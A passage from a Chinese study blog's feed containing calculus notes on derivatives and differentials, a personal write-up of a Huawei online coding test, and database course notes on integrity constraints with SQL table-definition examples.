t}$之间也有联系，称为相关变化率，有时给你其中一个导数，可以求出另外一个导数。</p><p><strong>解题方法：</strong></p><ol><li>找出相关变量的关系式</li><li>对上式中t求导，得到相关变化率之间的关系式</li><li>求出未知的相关变化率</li></ol><blockquote><p>一气球从离开观察员500m处离地面铅直上升，其速率为140 m&#x2F;min，当气球高度为500m时，观察员视线的仰角增加率是多少?&#x20;</p></blockquote><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_zwmCQjg0Ip.png"></p><ul><li>解题步骤：</li></ul><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_H6LvGsmmWQ.png"></p><hr><h1 id="3-高阶导数"><a href="#3-高阶导数" class="headerlink" title="3 高阶导数"></a>3 高阶导数</h1><p>n阶导数的定义式</p><p>$$<br>f^{(n)}(x)&#x3D;\lim _{h \rightarrow 0} \frac{f^{(n-1)}(x+h)-f^{(n-1)}(x)}{h}<br>$$</p><h2 id="3-1-求导方法"><a href="#3-1-求导方法" class="headerlink" title="3.1 求导方法"></a>3.1 求导方法</h2><h3 id="3-1-1-简单函数"><a href="#3-1-1-简单函数" class="headerlink" title="3.1.1 简单函数"></a>3.1.1 简单函数</h3><ul><li>依次求导，逐阶整理</li></ul><h3 id="3-1-2-复杂函数"><a href="#3-1-2-复杂函数" class="headerlink" title="3.1.2 复杂函数"></a>3.1.2 复杂函数</h3><ul><li>求导法则：</li></ul><p>$$<br>\left{\begin{array}{l}\(u \pm v)^{(n)}&#x3D;u^{(n)} \pm v^{(n)} \\(u v)^{(n)}&#x3D;\sum_{k&#x3D;0}^{n} C_{n}^{k} u^{(n-k)} v^{(k)}\\end{array}\right.一莱不尼莰公式<br>$$</p><hr><h1 id="4-函数的微分"><a href="#4-函数的微分" class="headerlink" title="4 函数的微分"></a>4 函数的微分</h1><h2 id="4-1-微分的概念"><a href="#4-1-微分的概念" class="headerlink" title="4.1 微分的概念"></a>4.1 微分的概念</h2><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_JFHHQH028_.png"></p><p>注意：</p><ol><li>微分的特性：<ul><li>Δx的线性函数</li><li>与Δy的差是Δx的高阶无穷小</li></ul></li><li>A仅与与x0有关，与Δx无关</li><li>dy与A及Δx有关</li></ol><p>y&#x3D;f(x)在x0处可微$\longleftrightarrow$y&#x3D;f(x)在x0处可导</p><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_hV4Ihl5Czy.png"></p><h2 id="4-2-几何意义"><a href="#4-2-几何意义" class="headerlink" title="4.2 几何意义"></a>4.2 几何意义</h2><p>$$<br>\Delta y&#x3D;f\left(x_{0}+\Delta x\right)-f\left(x_{0}\right)&#x3D;f^{\prime}\left(x_{0}\right) \Delta x+o(\Delta x)<br>$$</p><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_1w-_9ctKKw.png"></p><p>几何意义：切线纵坐标的增量</p><p>思想：在一个微小的局部“以直代曲，以不变代变”</p><h2 id="4-3-微分运算"><a href="#4-3-微分运算" class="headerlink" title="4.3 微分运算"></a>4.3 微分运算</h2><h3 id="4-3-1-基本初等函数的微分公式"><a href="#4-3-1-基本初等函数的微分公式" class="headerlink" title="4.3.1 基本初等函数的微分公式"></a>4.3.1 基本初等函数的微分公式</h3><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_Q8CG4RU_92.png"></p><h3 id="4-3-2-函数和、差、积、商的微分法则"><a href="#4-3-2-函数和、差、积、商的微分法则" class="headerlink" title="4.3.2 函数和、差、积、商的微分法则"></a>4.3.2 函数和、差、积、商的微分法则</h3><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_RMdxUeRksB.png"></p><h3 id="4-3-3-复合函数的微分法则"><a href="#4-3-3-复合函数的微分法则" class="headerlink" title="4.3.3 复合函数的微分法则"></a>4.3.3 复合函数的微分法则</h3><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_qAyeRsbb3G.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 高等数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机试记录1：华为机试</title>
      <link href="/2024/06/05/%E6%9C%BA%E8%AF%95%E8%AE%B0%E5%BD%951%EF%BC%9A%E5%8D%8E%E4%B8%BA%E6%9C%BA%E8%AF%95/"/>
      <url>/2024/06/05/%E6%9C%BA%E8%AF%95%E8%AE%B0%E5%BD%951%EF%BC%9A%E5%8D%8E%E4%B8%BA%E6%9C%BA%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="1-机试背景"><a href="#1-机试背景" class="headerlink" title="1 机试背景"></a>1 机试背景</h1><ul><li>机试公司：华为技术有限公司</li><li>机试岗位：推荐搜索</li><li>机试类型：线上机试</li><li>机试时间：2024-06-05 19:00~21:00</li><li>题目设置：一共 3 道题，分别为 100、200 和 300 分</li><li>机试结果：通过 😊</li></ul><hr><h1 id="2-第一题：电影相关"><a href="#2-第一题：电影相关" class="headerlink" title="2 第一题：电影相关"></a>2 第一题：电影相关</h1><h2 id="2-1-题目描述"><a href="#2-1-题目描述" class="headerlink" title="2.1 题目描述"></a>2.1 题目描述</h2><p>题意大体是第一行n是输入数据的个数，之后每一行的数据由三个字段组成：</p><ol><li>字段1：这部电影的导演</li><li>字段2：这部电影的主演</li><li>字段3：这部电影的类型</li></ol><p>然后给你一个查询，由两个字段组成：</p><ol><li>字段1：要查询的类型，是电影的导演、主演还是类型</li><li>字段2：要查询的内容</li></ol><p>让你把所有匹配的结果输出出来，注意id从小到大进行输出，不同id之间使用空格隔开。</p><p>这道题思路感觉还是挺简单的，不用使用任何的算法，直接按照题意描述做就可以，但是最后过了85%的测试用例，不知道为什么，就先做后面了。</p><hr><h1 id="3-第二题：服务器"><a href="#3-第二题：服务器" class="headerlink" title="3 第二题：服务器"></a>3 第二题：服务器</h1><h2 id="3-1-题目描述"><a href="#3-1-题目描述" class="headerlink" title="3.1 题目描述"></a>3.1 题目描述</h2><p>每个服务器用一个id和所能装载的文件数来描述，之后要进行查询和删除操作，并且这个题目实际上就是对一个循环链表进行插入和删除操作。</p><p>最后通过了96%的测试用例，另外这题的输入输出是真的麻烦，要自己进行处理，所以平时还是要多练自己处理输入的题目，要不然只写关键代码遇到这种题直接G了。</p><hr><h1 id="4-第三题：最长序列包长度"><a href="#4-第三题：最长序列包长度" class="headerlink" title="4 第三题：最长序列包长度"></a>4 第三题：最长序列包长度</h1><h2 id="4-1-题目描述"><a href="#4-1-题目描述" class="headerlink" title="4.1 题目描述"></a>4.1 题目描述</h2><p>大体意思就是告诉你，现在有一堆数字，这些数字代表了不同包中的序列号，同一个包中的序列号范围为0~65535，当65535加1变成0，之后让你求这些包中最长的序列长度是多少，感觉这题有点像贪心，最后只通过了36%的测试用例。</p><hr><h1 id="5-整体感受"><a href="#5-整体感受" class="headerlink" title="5 整体感受"></a>5 整体感受</h1><p>之前也进行过拼多多的机考，感觉这几次机考的整体算法难度不是很难，但是对于我来说难度最大的就是在考试的过程中你是不能知道测试数据的，题目只会一开始告诉你2~3个测试用例，但是这肯定不能包含所有。</p><p>所以说，之后在练习的时候争取先不看错误的数据，先自己想想代码的完备性是否有问题，实在想不出来了再去看，同时要总结哪些地方常出现问题。</p><p>感觉经过这几次机试自己的水平也在不断提升，起码已经适应了这种考试的模式，之后只需要多加练习即可。</p>]]></content>
      
      
      <categories>
          
          <category> 找工作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机考 </tag>
            
            <tag> 华为 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库第5章：数据库完整性</title>
      <link href="/2024/06/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%8C%E6%95%B4%E6%80%A7/"/>
      <url>/2024/06/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%8C%E6%95%B4%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1 基本概念"></a>1 基本概念</h1><p>数据的完整性和安全性是两个不同概念。</p><p><strong>数据的完整性：</strong></p><ul><li>防止数据库中存在不符合语义的数据，也就是防止数据库中存在不正确的数据</li><li>防范对象：不合语义的、不正确的数据</li></ul><p><strong>数据的安全性</strong>​</p><ul><li>保护数据库防止恶意的破坏和非法的存取</li><li>防范对象：非法用户和非法操作</li></ul><p><strong>为维护数据库的完整性，DBMS必须</strong>：</p><ol><li>提供定义完整性约束条件的机制</li><li>提供完整性检查的方法</li><li>违约处理</li></ol><p><strong>实体完整性和参照完整性：</strong></p><ul><li>关系模型必须满足的完整性约束条件</li><li>称为关系的两个不变性，应该由关系系统自动支持</li></ul><p><strong>用户定义的完整性：</strong></p><ul><li>应用领域需要遵循的约束条件，体现了具体领域中的语义约束&#x20;</li></ul><p><strong>实体完整性规则的说明</strong>：</p><ol><li><p>实体完整性规则是针对基本关系而言的。一个基本表通常对应现实世界的一个实体集。</p></li><li><p>现实世界中的实体是可区分的，即它们具有某种唯一性标识。</p></li><li><p>关系模型中以候选码作为唯一性标识。</p></li><li><p>候选码中的属性即主属性不能取空值。</p><p>主属性取空值，就说明存在某个不可标识的实体，即存在不可区分的实体，这与第2点相矛盾，因此这个规则称为实体完整性。</p></li></ol><hr><h1 id="2-实体完整性"><a href="#2-实体完整性" class="headerlink" title="2 实体完整性"></a>2 实体完整性</h1><h2 id="2-1-候选码、主码、主属性-xD"><a href="#2-1-候选码、主码、主属性-xD" class="headerlink" title="2.1 候选码、主码、主属性&#xD;"></a>2.1 候选码、主码、主属性&#xD;</h2><ul><li>关系中的某一属性组的值能唯一地标识一个元组，则称该属性组为候选码；</li><li>从候选码中选定一个作为主码；</li><li>候选码的诸属性称为主属性；</li><li>不包含在候选码中的属性称为非主属性；</li></ul><h2 id="2-2-外码（Foreign-Key）-xD"><a href="#2-2-外码（Foreign-Key）-xD" class="headerlink" title="2.2 外码（Foreign Key）&#xD;"></a>2.2 外码（Foreign Key）&#xD;</h2><p>设F是基本关系R的一个或一组属性，但不是关系R的码。如果F与基本关系S的主码Ks相对应，则称F是基本关系R的<strong>外码</strong>。</p><p>基本关系R称为<strong>参照关系（Referencing  Relation）</strong>。</p><p>基本关系S称为<strong>被参照关系（Referenced Relation）</strong>或<strong>目标关系（Target Relation）</strong>。</p><h2 id="2-3-实体完整性定义"><a href="#2-3-实体完整性定义" class="headerlink" title="2.3 实体完整性定义"></a>2.3 实体完整性定义</h2><p>单属性构成的码有两种说明方法&#x20;</p><ul><li>定义为列级约束条件</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> Student</span><br><span class="line">  (Sno  <span class="type">CHAR</span>(<span class="number">9</span>)  <span class="keyword">PRIMARY KEY</span>，</span><br><span class="line">   Sname  <span class="type">CHAR</span>(<span class="number">20</span>) <span class="keyword">NOT NULL</span>，     </span><br><span class="line">   Ssex  <span class="type">CHAR</span>(<span class="number">2</span>) ，</span><br><span class="line">   Sage  <span class="type">SMALLINT</span>，</span><br><span class="line">   Sdept  <span class="type">CHAR</span>(<span class="number">20</span>));</span><br></pre></td></tr></table></figure><ul><li>定义为表级约束条件</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> Student</span><br><span class="line">  (Sno  <span class="type">CHAR</span>(<span class="number">9</span>)，  </span><br><span class="line">   Sname  <span class="type">CHAR</span>(<span class="number">20</span>) <span class="keyword">NOT NULL</span>，</span><br><span class="line">   Ssex  <span class="type">CHAR</span>(<span class="number">2</span>) ，</span><br><span class="line">   Sage  <span class="type">SMALLINT</span>，</span><br><span class="line">   Sdept  <span class="type">CHAR</span>(<span class="number">20</span>)，</span><br><span class="line">   <span class="keyword">PRIMARY KEY</span> (Sno)</span><br><span class="line">); </span><br></pre></td></tr></table></figure><p>对多个属性构成的码只有一种说明方法</p><ul><li>定义为表级约束条件&#x20;</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> SC</span><br><span class="line"> (Sno   <span class="type">CHAR</span>(<span class="number">9</span>)  <span class="keyword">NOT NULL</span>， </span><br><span class="line">  Cno  <span class="type">CHAR</span>(<span class="number">4</span>)  <span class="keyword">NOT NULL</span>，  </span><br><span class="line">  Grade    <span class="type">SMALLINT</span>，</span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (Sno，Cno)     <span class="comment">/*只能在表级定义主码*/</span></span><br><span class="line">); </span><br></pre></td></tr></table></figure><h2 id="2-4-实体完整性检查和违约处理-xD"><a href="#2-4-实体完整性检查和违约处理-xD" class="headerlink" title="2.4 实体完整性检查和违约处理&#xD;"></a>2.4 实体完整性检查和违约处理&#xD;</h2><p>插入或对主码列进行更新操作时，RDBMS按照实体完整性规则自动进行检查。包括：</p><ol><li><p>检查主码值是否唯一，如果不唯一则拒绝插入或修改</p><p>检查记录中主码值是否唯一的一种方法是进行<strong>全表扫描</strong></p></li></ol><p><img src="/2024/06/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%8C%E6%95%B4%E6%80%A7/image_MLGHaZ9Is-.png"></p><p><img src="/2024/06/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%8C%E6%95%B4%E6%80%A7/image_zW8H8fOsS4.png"></p><p>检查主码的各个属性是否为空，只要有一个为空就拒绝插入或修改。</p><hr><h1 id="3-参照完整性"><a href="#3-参照完整性" class="headerlink" title="3 参照完整性"></a>3 参照完整性</h1><h2 id="3-1-参照完整性定义"><a href="#3-1-参照完整性定义" class="headerlink" title="3.1 参照完整性定义"></a>3.1 参照完整性定义</h2><ul><li>在<code>CREATE TABLE</code>中用<code>FOREIGN KEY</code>短语定义哪些列为外码</li><li>用<code>REFERENCES</code>短语指明这些外码参照哪些表的主码</li></ul><blockquote><p>例如，关系SC中一个元组表示一个学生选修的某门课程的成绩，（Sno，Cno）是主码。Sno，Cno分别参照引用Student表的主码和Course表的主码</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> SC</span><br><span class="line">   (Sno    <span class="type">CHAR</span>(<span class="number">9</span>)  <span class="keyword">NOT NULL</span>， </span><br><span class="line">    Cno    <span class="type">CHAR</span>(<span class="number">4</span>)  <span class="keyword">NOT NULL</span>，  </span><br><span class="line">    Grade    <span class="type">SMALLINT</span>，</span><br><span class="line">    <span class="keyword">PRIMARY KEY</span> (Sno， Cno)，   <span class="comment">/*在表级定义实体完整性*/</span></span><br><span class="line">    <span class="keyword">FOREIGN KEY</span> (Sno) <span class="keyword">REFERENCES</span> Student(Sno)，  </span><br><span class="line">    <span class="comment">/*在表级定义参照完整性*/</span></span><br><span class="line">    <span class="keyword">FOREIGN KEY</span> (Cno) <span class="keyword">REFERENCES</span> Course(Cno)    </span><br><span class="line">    <span class="comment">/*在表级定义参照完整性*/</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="3-2-参照完整性检查和违约处理"><a href="#3-2-参照完整性检查和违约处理" class="headerlink" title="3.2 参照完整性检查和违约处理"></a>3.2 参照完整性检查和违约处理</h2><p>可能破坏参照完整性的情况及违约处理：</p><p><img src="/2024/06/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%8C%E6%95%B4%E6%80%A7/image_gGEGvS1hRK.png"></p><ol><li><p>拒绝（NO ACTION）执行，默认策略，不允许该操作执行。</p></li><li><p>级联（CASCADE）操作<br>当删除或修改被参照表的一个元组导致与参照表的不一致时，删除或修改参照表中所有导致不一致的元组。</p></li><li><p>设置为空值（SET-NULL）</p><p>当删除或修改被参照表的一个元组导致与参照表的不一致时，则将参照表中的所有造成不一致的元组的对应树形设置为空值。</p><p>对于参照完整性，除了应该定义外码，还应定义外码列是否允许空值</p></li></ol><p>显式说明参照完整性的违约处理示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> SC</span><br><span class="line">  (Sno   <span class="type">CHAR</span>(<span class="number">9</span>)  <span class="keyword">NOT NULL</span>，</span><br><span class="line">   Cno   <span class="type">CHAR</span>(<span class="number">4</span>)  <span class="keyword">NOT NULL</span>，</span><br><span class="line">   Grade  <span class="type">SMALLINT</span>，</span><br><span class="line">   <span class="keyword">PRIMARY KEY</span>（Sno，Cno），    </span><br><span class="line">   <span class="comment">/*级联删除SC表中相应的元组*/</span></span><br><span class="line">   <span class="keyword">FOREIGN KEY</span> (Sno) <span class="keyword">REFERENCES</span> Student(Sno) <span class="keyword">ON</span> <span class="keyword">DELETE</span> CASCADE     </span><br><span class="line">          <span class="keyword">ON</span> <span class="keyword">UPDATE</span> CASCADE， <span class="comment">/*级联更新SC表中相应的元组*/</span></span><br><span class="line">   <span class="keyword">FOREIGN KEY</span> (Cno) <span class="keyword">REFERENCES</span> Course(Cno) <span class="keyword">ON</span> <span class="keyword">DELETE</span> <span class="keyword">NO</span> ACTION   </span><br><span class="line">         <span class="comment">/*当删除course 表中的元组造成了与SC表不一致时拒绝删除*/</span></span><br><span class="line">         <span class="keyword">ON</span> <span class="keyword">UPDATE</span> CASCADE   </span><br><span class="line">  <span class="comment">/*当更新course表中的cno时，级联更新SC表中相应的元组*/</span></span><br><span class="line">  )；</span><br></pre></td></tr></table></figure><hr><h1 id="4-用户定义的完整性"><a href="#4-用户定义的完整性" class="headerlink" title="4 用户定义的完整性"></a>4 用户定义的完整性</h1><p>用户定义的完整性就是针对某一具体应用的数据必须满足的语义要求，RDBMS提供，而不必由应用程序承担。</p><h2 id="4-1-属性上的约束条件"><a href="#4-1-属性上的约束条件" class="headerlink" title="4.1 属性上的约束条件"></a>4.1 属性上的约束条件</h2><p>CREATE TABLE定义属性的同时，可以根据应用要求定义属性上的约束条件，即属性值限制，包括：</p><ul><li>列值非空（NOT NULL）</li></ul><blockquote><p>在定义SC表时，说明Sno、Cno、Grade属性不允许取空值。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> SC</span><br><span class="line">（Sno    <span class="type">CHAR</span>(<span class="number">9</span>)  <span class="keyword">NOT NULL</span>，  </span><br><span class="line">  Cno    <span class="type">CHAR</span>(<span class="number">4</span>)  <span class="keyword">NOT NULL</span>，  </span><br><span class="line">  Grade  <span class="type">SMALLINT</span> <span class="keyword">NOT NULL</span>，  </span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (Sno， Cno)，  </span><br><span class="line">  <span class="comment">/* 如果在表级定义实体完整性，隐含了Sno，Cno不允许取空值，则在列级不允许取空值的定义就不必写了 * /</span></span><br><span class="line"><span class="comment">）； </span></span><br></pre></td></tr></table></figure><ul><li>列值唯一（UNIQUE）</li></ul><blockquote><p>建立部门表DEPT，要求部门名称Dname列取值唯一，部门编号Deptno列为主码。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> DEPT</span><br><span class="line">  ( Deptno  <span class="type">NUMERIC</span>(<span class="number">2</span>)，</span><br><span class="line">    Dname   <span class="type">CHAR</span>(<span class="number">9</span>)  <span class="keyword">UNIQUE</span>，<span class="comment">/*要求Dname列值唯一*/</span></span><br><span class="line">    Location  <span class="type">CHAR</span>(<span class="number">10</span>)，</span><br><span class="line">    <span class="keyword">PRIMARY KEY</span> (Deptno)</span><br><span class="line">  )；</span><br></pre></td></tr></table></figure><ul><li>检查列值是否满足一个布尔表达式（CHECK）</li></ul><blockquote><p>Student表的Ssex只允许取“男”或“女”。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> Student</span><br><span class="line">  ( Sno   <span class="type">CHAR</span>(<span class="number">9</span>) <span class="keyword">PRIMARY KEY</span>，</span><br><span class="line">    Sname <span class="type">CHAR</span>(<span class="number">8</span>) <span class="keyword">NOT NULL</span>，                     </span><br><span class="line">    Ssex  <span class="type">CHAR</span>(<span class="number">2</span>)  <span class="keyword">CHECK</span> (Ssex <span class="keyword">IN</span> (‘男’，‘女’) ) ，                </span><br><span class="line">        <span class="comment">/*性别属性Ssex只允许取&#x27;男&#x27;或&#x27;女&#x27; */</span></span><br><span class="line">    Sage  <span class="type">SMALLINT</span>，</span><br><span class="line">    Sdept  <span class="type">CHAR</span>(<span class="number">20</span>)</span><br><span class="line">  );</span><br></pre></td></tr></table></figure><p>插入元组或修改属性的值时，RDBMS检查属性上的约束条件是否被满足，如果不满足则操作被拒绝执行。</p><h2 id="4-2-元组上的约束条件的定义"><a href="#4-2-元组上的约束条件的定义" class="headerlink" title="4.2 元组上的约束条件的定义"></a>4.2 元组上的约束条件的定义</h2><p>在CREATE TABLE时可以用CHECK短语定义元组上的约束条件，即<strong>元组级的限制</strong>。</p><p>同属性值限制相比，元组级的限制可以设置不同属性之间的取值的相互约束条件。</p><blockquote><p>当学生的性别是男时，其名字不能以Ms.打头。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> Student</span><br><span class="line">   (Sno    <span class="type">CHAR</span>(<span class="number">9</span>)， </span><br><span class="line">    Sname  <span class="type">CHAR</span>(<span class="number">8</span>) <span class="keyword">NOT NULL</span>，</span><br><span class="line">    Ssex    <span class="type">CHAR</span>(<span class="number">2</span>)，</span><br><span class="line">    Sage   <span class="type">SMALLINT</span>，</span><br><span class="line">    Sdept  <span class="type">CHAR</span>(<span class="number">20</span>)，</span><br><span class="line">    <span class="keyword">PRIMARY KEY</span> (Sno)，</span><br><span class="line">    <span class="keyword">CHECK</span> (Ssex<span class="operator">=</span><span class="string">&#x27;女&#x27;</span> <span class="keyword">OR</span> Sname <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">&#x27;Ms.%&#x27;</span>)</span><br><span class="line">    <span class="comment">/*定义了元组中Sname和 Ssex两个属性值之间的约束条件*/</span></span><br><span class="line">)；</span><br></pre></td></tr></table></figure><p>插入元组或修改属性的值时，RDBMS检查元组上的约束条件是否被满足，如果不满足则操作被拒绝执行。</p><hr><h1 id="5-完整性约束命名子句"><a href="#5-完整性约束命名子句" class="headerlink" title="5 完整性约束命名子句"></a>5 完整性约束命名子句</h1><p>完整性约束可以被命名以方便管理，从而可以灵活地增加、删除一个完整性约束条件。</p><h2 id="5-1-完整性约束命名子句"><a href="#5-1-完整性约束命名子句" class="headerlink" title="5.1 完整性约束命名子句"></a>5.1 完整性约束命名子句</h2><p>CONSTRAINT 约束：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CONSTRAINT</span> <span class="operator">&lt;</span>完整性约束条件名<span class="operator">&gt;</span></span><br><span class="line">  ［<span class="keyword">PRIMARY KEY</span>短语</span><br><span class="line">   <span class="operator">|</span><span class="keyword">FOREIGN KEY</span>短语</span><br><span class="line">   <span class="operator">|</span><span class="keyword">CHECK</span>短语］</span><br></pre></td></tr></table></figure><blockquote><p>建立学生登记表Student，要求学号在90000~99999之间，姓名不能取空值，年龄小于30，性别只能是“男”或“女”。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> Student</span><br><span class="line">  ( Sno  <span class="type">NUMERIC</span>(<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> C1 <span class="keyword">CHECK</span> (Sno <span class="keyword">BETWEEN</span> <span class="number">90000</span> <span class="keyword">AND</span> <span class="number">99999</span>)，</span><br><span class="line">    Sname  <span class="type">CHAR</span>(<span class="number">20</span>)  </span><br><span class="line">    <span class="keyword">CONSTRAINT</span> C2 <span class="keyword">NOT NULL</span>，</span><br><span class="line">    Sage  <span class="type">NUMERIC</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> C3 <span class="keyword">CHECK</span> (Sage <span class="operator">&lt;</span> <span class="number">30</span>)，</span><br><span class="line">    Ssex  <span class="type">CHAR</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> C4 <span class="keyword">CHECK</span> (Ssex <span class="keyword">IN</span> ( <span class="string">&#x27;男&#x27;</span>，<span class="string">&#x27;女&#x27;</span>))，</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> StudentKey <span class="keyword">PRIMARY KEY</span>(Sno)</span><br><span class="line">  )；</span><br></pre></td></tr></table></figure><ul><li>Student表上建立了5个约束条件，包括主码约束（命名为StudentKey）以及C1、C2、C3、C4四个列级约束。</li></ul><blockquote><p>建立教师表TEACHER，要求每个教师的工资不低于3000元。应发工资是工资列Sal与扣除项Deduct之和。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> TEACHER</span><br><span class="line">(  Eno    <span class="type">NUMERIC</span>(<span class="number">4</span>)  <span class="keyword">PRIMARY  KEY</span></span><br><span class="line">   Ename  <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">   Job    <span class="type">CHAR</span>(<span class="number">8</span>),</span><br><span class="line">   Sal    <span class="type">NUMERIC</span>(<span class="number">7</span>,<span class="number">2</span>),</span><br><span class="line">   Deduct <span class="type">NUMERIC</span>(<span class="number">7</span>,<span class="number">2</span>),</span><br><span class="line">   Deptno <span 